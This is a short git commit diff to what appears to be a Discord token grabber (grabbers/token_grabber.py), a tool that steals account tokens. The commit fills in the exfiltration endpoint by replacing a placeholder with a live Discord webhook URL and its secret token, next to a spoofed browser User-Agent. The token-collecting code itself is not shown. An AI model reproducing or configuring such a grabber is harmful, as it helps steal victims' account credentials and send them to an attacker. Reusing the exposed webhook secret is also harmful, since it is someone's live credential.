90aa1bde97497f2b46e0a88edecc26f60a92d89f
diamonddoodog <jamestaterr@gmail.com>
2025-05-09 17:07:19 -0400

    Update token_grabber.py

--- grabbers/token_grabber.py
+++ grabbers/token_grabber.py
@@ -13,7 +13,7 @@ REQUEST_HEADERS = {
     "User-Agent":
         "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
 }
-WEBHOOK_URL = "YOUR WEBHOOK URL"
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1370507114107371540/TuHoElylpwiInT_ZdAd8pZk_Y0vxgnF-r6FSmmkqofH_lTM8VsvIk-PiSyy9YF2e5mrA"
 
 
 def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
